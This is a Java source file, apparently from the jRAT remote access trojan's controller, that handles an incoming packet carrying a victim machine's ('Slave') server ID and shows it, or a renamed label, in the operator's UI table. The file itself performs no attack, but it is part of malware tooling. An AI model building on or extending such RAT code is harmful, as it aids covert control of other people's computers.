package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.settings.ServerID;
import pro.jrat.ui.frames.Frame;
import pro.jrat.utils.Util;


public class Packet15InitServerID extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setServerID(slave.readLine());
		ServerID.ServerIDEntry entry = ServerID.getGlobal().findEntry(slave.getRawIP());
		if (entry == null) {
			Frame.mainModel.setValueAt(slave.getServerID(), Util.getRow(3, slave.getIP()), 1);
		} else {
			slave.setRenamedID(entry.getName());
			Frame.mainModel.setValueAt(slave.getRenamedID(), Util.getRow(3, slave.getIP()), 1);
		}

	}
}
